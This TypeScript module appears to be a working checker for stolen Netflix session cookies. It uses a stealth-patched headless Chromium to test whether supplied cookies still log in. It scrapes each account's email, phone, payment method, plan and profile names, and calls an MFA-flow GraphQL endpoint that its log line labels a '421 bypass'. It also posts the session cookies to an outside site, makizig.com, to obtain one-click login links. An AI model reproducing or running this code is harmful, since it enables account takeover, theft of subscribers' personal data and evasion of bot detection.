import { chromium } from "playwright-extra";
import type { Browser, BrowserContext, Page } from "playwright";
import StealthPlugin from "puppeteer-extra-plugin-stealth";
import { execSync } from "child_process";
import { log } from "./logger";

chromium.use(StealthPlugin());

function findChromiumPath(): string | undefined {
  if (process.env.PLAYWRIGHT_CHROMIUM_EXECUTABLE_PATH) {
    return process.env.PLAYWRIGHT_CHROMIUM_EXECUTABLE_PATH;
  }
  try {
    const path = execSync("which chromium", { encoding: "utf-8" }).trim();
    if (path) return path;
  } catch {}
  try {
    const path = execSync("which chromium-browser", { encoding: "utf-8" }).trim();
    if (path) return path;
  } catch {}
  try {
    const path = execSync("which google-chrome", { encoding: "utf-8" }).trim();
    if (path) return path;
  } catch {}
  return undefined;
}

const CHROMIUM_PATH = findChromiumPath();

interface CookieObj {
  name: string;
  value: string;
  domain?: string;
  path?: string;
  httpOnly?: boolean;
  secure?: boolean;
  [key: string]: any;
}

let browserInstance: Browser | null = null;
let browserLaunchPromise: Promise<Browser> | null = null;

type QueueItem = {
  task: () => Promise<any>;
  resolve: (value: any) => void;
  reject: (err: any) => void;
};

const requestQueue: QueueItem[] = [];
let isProcessing = false;

async function processQueue() {
  if (isProcessing) return;
  isProcessing = true;

  while (requestQueue.length > 0) {
    const item = requestQueue.shift()!;
    try {
      const result = await item.task();
      item.resolve(result);
    } catch (err) {
      item.reject(err);
    }
  }

  isProcessing = false;
}

function enqueue<T>(task: () => Promise<T>): Promise<T> {
  return new Promise<T>((resolve, reject) => {
    requestQueue.push({ task, resolve, reject });
    processQueue();
  });
}

async function getBrowser(): Promise<Browser> {
  if (browserInstance?.isConnected()) return browserInstance;

  if (browserLaunchPromise) return browserLaunchPromise;

  browserLaunchPromise = (async () => {
    try {
      if (!CHROMIUM_PATH) {
        throw new Error("No Chromium executable found on system");
      }
      log(`Launching Chromium from: ${CHROMIUM_PATH}`);
      const b = await chromium.launch({
        executablePath: CHROMIUM_PATH,
        headless: true,
        args: [
          "--no-sandbox",
          "--disable-setuid-sandbox",
          "--disable-blink-features=AutomationControlled",
          "--disable-dev-shm-usage",
          "--disable-gpu",
        ],
      });
      log("Chromium launched successfully");
      browserInstance = b;
      b.on("disconnected", () => {
        browserInstance = null;
        browserLaunchPromise = null;
      });
      return b;
    } catch (e: any) {
      log(`Failed to launch Chromium: ${e.message}`);
      browserLaunchPromise = null;
      throw e;
    }
  })();

  return browserLaunchPromise;
}

function parseCookies(cookies: CookieObj[] | string): CookieObj[] {
  if (typeof cookies === "string") {
    try {
      const parsed = JSON.parse(cookies);
      if (Array.isArray(parsed)) return parsed;
    } catch {}
    return cookies.split(";").map((c) => {
      const [name, ...rest] = c.trim().split("=");
      return { name: name.trim(), value: rest.join("=").trim() };
    });
  }
  return Array.isArray(cookies) ? cookies : [];
}

function toCookieHeader(cookies: CookieObj[]): string {
  return cookies
    .filter((c) => c.name && c.value)
    .map((c) => `${c.name}=${c.value}`)
    .join("; ");
}

async function createNetflixContext(cookies: CookieObj[]): Promise<{ context: BrowserContext; page: Page }> {
  const browser = await getBrowser();

  const context = await browser.newContext({
    userAgent:
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    viewport: { width: 1920, height: 1080 },
    locale: "en-US",
    timezoneId: "America/New_York",
  });

  const page = await context.newPage();

  await page.addInitScript(() => {
    Object.defineProperty(navigator, "webdriver", { get: () => false });
    Object.defineProperty(navigator, "plugins", { get: () => [1, 2, 3, 4, 5] });
    Object.defineProperty(navigator, "languages", { get: () => ["en-US", "en"] });
    (window as any).chrome = { runtime: {} };
  });

  const cookieObjects = cookies
    .filter((c) => c.name && c.value)
    .map((c) => ({
      name: c.name,
      value: c.value,
      domain: c.domain || ".netflix.com",
      path: c.path || "/",
      httpOnly: c.httpOnly || false,
      secure: c.secure !== false,
      sameSite: "None" as const,
    }));

  await context.addCookies(cookieObjects);

  return { context, page };
}

interface GraphQLResult {
  status: number;
  data: any;
}

async function callNetflixGraphQL(
  page: Page,
  operationName: string,
  variables: Record<string, any>,
  persistedQueryId: string,
  buildId: string
): Promise<GraphQLResult> {
  return page.evaluate(
    async ({ operationName, variables, persistedQueryId, buildId }) => {
      const res = await fetch("https://web.prod.cloud.netflix.com/graphql", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Accept: "*/*",
          "x-netflix.request.client.context": '{"appstate":"foreground"}',
          "x-netflix.request.attempt": "1",
          "x-netflix.context.ui-flavor": "akira",
          "x-netflix.context.app-version": buildId,
          "x-netflix.context.hawkins-version": "5.12.1",
          "x-netflix.context.locales": "en-us",
          "x-netflix.request.originating.url": "https://www.netflix.com/account",
          "x-netflix.request.toplevel.uuid": crypto.randomUUID(),
          "x-netflix.request.id": crypto.randomUUID().replace(/-/g, ""),
          "x-netflix.context.operation-name": operationName,
          "x-netflix.request.clcs.bucket": "high",
        },
        body: JSON.stringify({
          operationName,
          variables,
          extensions: {
            persistedQuery: { id: persistedQueryId, version: 102 },
          },
        }),
      });
      return { status: res.status, data: JSON.parse(await res.text()) };
    },
    { operationName, variables, persistedQueryId, buildId }
  );
}

export interface PlaywrightNftokenResult {
  nftoken: string | null;
  watchLink: string | null;
  error?: string;
}

export function generateNftokenViaPlaywright(
  cookies: CookieObj[] | string
): Promise<PlaywrightNftokenResult> {
  const cookieList = parseCookies(cookies);

  if (cookieList.length === 0) {
    return Promise.resolve({ nftoken: null, watchLink: null, error: "No cookies provided" });
  }

  return enqueue(() => _generateNftokenViaPlaywright(cookieList));
}

async function _generateNftokenViaPlaywright(
  cookieList: CookieObj[]
): Promise<PlaywrightNftokenResult> {
  let context: BrowserContext | null = null;

  try {
    const { context: ctx, page } = await createNetflixContext(cookieList);
    context = ctx;

    await page.goto("https://www.netflix.com/YourAccount", {
      waitUntil: "domcontentloaded",
      timeout: 30000,
    });

    const pageUrl = page.url();
    if (pageUrl.includes("/login") || pageUrl.includes("/Login")) {
      return { nftoken: null, watchLink: null, error: "Cookie is dead / expired" };
    }

    const buildId = await page.evaluate(
      () => (window as any).netflix?.reactContext?.models?.serverDefs?.data?.BUILD_IDENTIFIER
    );

    if (!buildId) {
      return { nftoken: null, watchLink: null, error: "Could not get Netflix build ID" };
    }

    const result = await callNetflixGraphQL(
      page,
      "GrowthGetNextNodeForMfaFlow",
      {
        currentNode: "YOUR_ACCOUNT",
        growthAction: "MANAGE_ACCOUNT_ACCESS",
        sessionId: "session-" + Date.now(),
        extraContextMap: [],
      },
      "6e71896c-6bd0-4345-b867-acf8c2e56906",
      buildId
    );

    if (result.status === 200) {
      const nextNode = result.data?.data?.growthGetNextNodeForMfaFlow?.userJourneyNode;
      log(`GraphQL MFA flow: YOUR_ACCOUNT -> ${nextNode} (421 bypass successful via web.prod GraphQL)`);

      if (nextNode === "MANAGE_ACCOUNT_ACCESS") {
        const stage2 = await callNetflixGraphQL(
          page,
          "GrowthGetNextNodeForMfaFlow",
          {
            currentNode: nextNode,
            growthAction: "MANAGE_ACCOUNT_ACCESS",
            sessionId: "session-" + Date.now(),
            extraContextMap: [],
          },
          "6e71896c-6bd0-4345-b867-acf8c2e56906",
          buildId
        );

        const node2 = stage2.data?.data?.growthGetNextNodeForMfaFlow?.userJourneyNode;
        const error2 = stage2.data?.data?.growthGetNextNodeForMfaFlow?.errorCode;
        log(`GraphQL MFA flow stage 2: ${nextNode} -> ${node2 || error2 || "unknown"}`);
      }
    }

    const cookieHeader = toCookieHeader(cookieList);
    const nftokenResult = await fetchNftokenFromMakizig(cookieHeader, cookieList);

    return nftokenResult;
  } catch (err: any) {
    log(`Playwright Netflix error: ${err.message}`);
    return { nftoken: null, watchLink: null, error: err.message };
  } finally {
    if (context) {
      try {
        await context.close();
      } catch {}
    }
  }
}

async function fetchNftokenFromMakizig(
  cookieHeader: string,
  cookieList: CookieObj[]
): Promise<PlaywrightNftokenResult> {
  const netflixId = cookieList.find((c) => c.name === "NetflixId")?.value;
  const secureNetflixId = cookieList.find((c) => c.name === "SecureNetflixId")?.value;

  const cookieToSend =
    netflixId && secureNetflixId
      ? `NetflixId=${netflixId}; SecureNetflixId=${secureNetflixId}`
      : cookieHeader;

  try {
    const formData = new URLSearchParams();
    formData.append("raw_cookie", cookieToSend);

    const r = await fetch("https://makizig.com/unli-netflix/", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        Accept: "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "en-US,en;q=0.5",
        "X-Requested-With": "XMLHttpRequest",
        Origin: "https://makizig.com",
        Referer: "https://makizig.com/unli-netflix/",
      },
      body: formData.toString(),
      signal: AbortSignal.timeout(30000),
    });

    const html = await r.text();
    const linkMatch = html.match(/<textarea id="hiddenLink"[^>]*>([\s\S]*?)<\/textarea>/);
    if (linkMatch) {
      const link = linkMatch[1].trim();
      if (link.includes("nftoken=")) {
        const nftoken = link.match(/nftoken=([^&"'\s]+)/)?.[1] || null;
        return {
          nftoken,
          watchLink: link.replace(/netflix\.com\/account\?/, "netflix.com/browse?"),
        };
      }
    }
    return { nftoken: null, watchLink: null, error: "No nftoken in makizig response" };
  } catch (err: any) {
    log(`Makizig fetch failed: ${err.message}`);
    return { nftoken: null, watchLink: null, error: `Makizig error: ${err.message}` };
  }
}

export interface PlaywrightAccountData {
  valid: boolean;
  error?: string;
  plan?: string;
  price?: string;
  country?: string;
  email?: string;
  profiles?: string;
  memberSince?: string;
  paymentMethod?: string;
  phone?: string;
  phoneVerified?: string;
  emailVerified?: string;
  videoQuality?: string;
  maxStreams?: string;
  status?: string;
  premium?: string;
  extraMember?: string;
  billing?: string;
  paymentHold?: string;
  watchLink?: string;
  rawData?: string;
}

export function validateNetflixViaPlaywright(
  cookies: CookieObj[] | string
): Promise<PlaywrightAccountData> {
  const cookieList = parseCookies(cookies);

  if (cookieList.length === 0) {
    return Promise.resolve({ valid: false, error: "No cookies provided" });
  }

  return enqueue(() => _validateNetflixViaPlaywright(cookieList));
}

async function _validateNetflixViaPlaywright(
  cookieList: CookieObj[]
): Promise<PlaywrightAccountData> {
  let context: BrowserContext | null = null;

  try {
    const { context: ctx, page } = await createNetflixContext(cookieList);
    context = ctx;

    await page.goto("https://www.netflix.com/YourAccount", {
      waitUntil: "domcontentloaded",
      timeout: 30000,
    });

    const pageUrl = page.url();
    if (pageUrl.includes("/login") || pageUrl.includes("/Login")) {
      return { valid: false, error: "Cookie is dead / expired" };
    }

    const accountData = await page.evaluate(() => {
      const ctx = (window as any).netflix?.reactContext;
      if (!ctx) return null;

      const userInfo = ctx?.models?.userInfo?.data || {};
      const signupData = ctx?.models?.signupContext?.data?.flow?.fields || {};
      const currentPlan = signupData?.currentPlan?.fields || {};
      const graphqlData = ctx?.models?.graphql?.data || {};

      const profileNames: string[] = [];
      for (const key of Object.keys(graphqlData)) {
        if (key.startsWith("Profile:")) {
          const profile = graphqlData[key];
          if (profile?.name) profileNames.push(profile.name);
        }
      }

      let emailVerified: string | undefined;
      for (const key of Object.keys(graphqlData)) {
        if (key.startsWith("Profile:")) {
          const profile = graphqlData[key];
          if (profile?.growthEmail?.isVerified !== undefined) {
            emailVerified = profile.growthEmail.isVerified ? "Yes" : "No";
            break;
          }
        }
      }

      return {
        plan: currentPlan?.localizedPlanName?.value,
        price: currentPlan?.planPrice?.value,
        email: userInfo.emailAddress,
        country: userInfo.countryOfSignup || userInfo.currentCountry,
        memberSince: userInfo.memberSince,
        membershipStatus: userInfo.membershipStatus,
        maxStreams: currentPlan?.maxStreams?.value?.toString(),
        videoQuality: currentPlan?.videoQuality?.value,
        profileNames,
        emailVerified,
        phoneNumber: userInfo.phoneNumber,
        phoneVerified: userInfo.phoneVerified,
        isExtraMember: signupData?.isExtraMember?.value,
        nextBillingDate: signupData?.nextBillingDate?.value,
        paymentMethods: signupData?.paymentMethods?.value,
        isCanceled: signupData?.isCanceled?.value || userInfo.membershipStatus === "CANCELLED",
        isPaymentHold: signupData?.isPaymentHold?.value,
        buildId: ctx?.models?.serverDefs?.data?.BUILD_IDENTIFIER,
      };
    });

    if (!accountData) {
      return { valid: false, error: "Could not parse Netflix account data" };
    }

    let paymentMethod: string | undefined;
    if (Array.isArray(accountData.paymentMethods) && accountData.paymentMethods.length > 0) {
      const pm = accountData.paymentMethods[0]?.value;
      paymentMethod = pm?.paymentMethod?.value || pm?.type?.value;
    }

    const isCancelled = accountData.isCanceled || accountData.membershipStatus === "CANCELLED";
    const status = isCancelled ? "Cancelled" : "Valid";

    const plan = accountData.plan;
    const premium = plan?.toLowerCase().includes("premium")
      ? "Yes"
      : plan?.toLowerCase().includes("standard")
        ? "Yes"
        : plan?.toLowerCase().includes("basic")
          ? "No"
          : plan
            ? "Yes"
            : undefined;

    const profiles =
      accountData.profileNames.length > 0 ? accountData.profileNames.join(", ") : undefined;

    const cookieHeader = toCookieHeader(cookieList);
    const netflixId = cookieList.find((c) => c.name === "NetflixId")?.value;
    const secureNetflixId = cookieList.find((c) => c.name === "SecureNetflixId")?.value;

    let watchLink: string | null = null;
    const nftokenResult = await fetchNftokenFromMakizig(cookieHeader, cookieList);
    watchLink = nftokenResult.watchLink;

    const rawParts: string[] = [];
    if (plan) rawParts.push(`Plan: ${plan}`);
    if (accountData.country) rawParts.push(`Country: ${accountData.country}`);
    if (accountData.price) rawParts.push(`Price: ${accountData.price}`);
    if (accountData.email) rawParts.push(`\nEmail: ${accountData.email}`);
    if (profiles) rawParts.push(`\nProfiles: ${profiles}`);

    return {
      valid: true,
      status,
      premium,
      country: accountData.country?.toUpperCase(),
      plan,
      price: accountData.price,
      memberSince: accountData.memberSince,
      paymentMethod,
      phone: accountData.phoneNumber,
      phoneVerified:
        accountData.phoneVerified === true
          ? "Yes"
          : accountData.phoneVerified === false
            ? "No"
            : undefined,
      videoQuality: accountData.videoQuality,
      maxStreams: accountData.maxStreams,
      paymentHold:
        accountData.isPaymentHold === true
          ? "Yes"
          : accountData.isPaymentHold === false
            ? "No"
            : undefined,
      extraMember:
        accountData.isExtraMember === true
          ? "Yes"
          : accountData.isExtraMember === false
            ? "No"
            : undefined,
      email: accountData.email,
      emailVerified: accountData.emailVerified,
      profiles,
      billing: accountData.nextBillingDate
        ? String(accountData.nextBillingDate)
        : undefined,
      watchLink: watchLink || undefined,
      rawData: rawParts.join(" | ") || undefined,
    };
  } catch (err: any) {
    log(`Playwright validation error: ${err.message}`);
    return { valid: false, error: `Validation failed: ${err.message}` };
  } finally {
    if (context) {
      try {
        await context.close();
      } catch {}
    }
  }
}

export async function closeBrowser(): Promise<void> {
  if (browserInstance) {
    try {
      await browserInstance.close();
    } catch {}
    browserInstance = null;
    browserLaunchPromise = null;
  }
}
